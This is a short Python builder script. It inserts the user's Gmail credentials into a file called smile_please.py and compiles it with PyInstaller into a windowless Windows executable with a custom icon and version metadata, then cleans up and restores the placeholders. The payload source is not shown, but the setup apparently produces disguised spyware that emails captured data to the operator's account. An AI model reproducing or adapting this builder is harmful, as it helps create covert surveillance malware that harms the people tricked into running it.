import os
from shutil import copyfile

def start():
        gmail = input('Enter your Gmail ID:- ')
        password =input('Enter your Gmail Password:- ')
        with open('Source_Files/smile_please.py', 'r') as file :
            filedata = file.read()
        if 'your_gmail@gmail.com' in filedata:
            filedata = filedata.replace('your_gmail@gmail.com',gmail)
        with open('Source_Files/smile_please.py', 'w') as file:
            file.write(filedata)
        with open('Source_Files/smile_please.py', 'r') as file :
            filedata = file.read()
        if 'your_password@1234' in filedata:
            filedata = filedata.replace('your_password@1234',password)
        with open('Source_Files/smile_please.py', 'w') as file:
            file.write(filedata)


        os.system('pyinstaller --onefile --icon=Source_Files/icon.ico --version-file Source_Files/version.txt --noconsole Source_Files/smile_please.py')
        os.system('rd /s /q build')
        os.remove('smile_please.spec')
        copyfile('dist/smile_please.exe', 'smile_please.exe')
        os.system('rd /s /q dist')


        with open('Source_Files/smile_please.py', 'r') as file :
            filedata = file.read()
        if gmail in filedata:
            filedata = filedata.replace(gmail,'your_gmail@gmail.com')
        with open('Source_Files/smile_please.py', 'w') as file:
            file.write(filedata)
        with open('Source_Files/smile_please.py', 'r') as file :
            filedata = file.read()
        if password in filedata:
            filedata = filedata.replace(password,'your_password@1234')
        with open('Source_Files/smile_please.py', 'w') as file:
            file.write(filedata)
start()
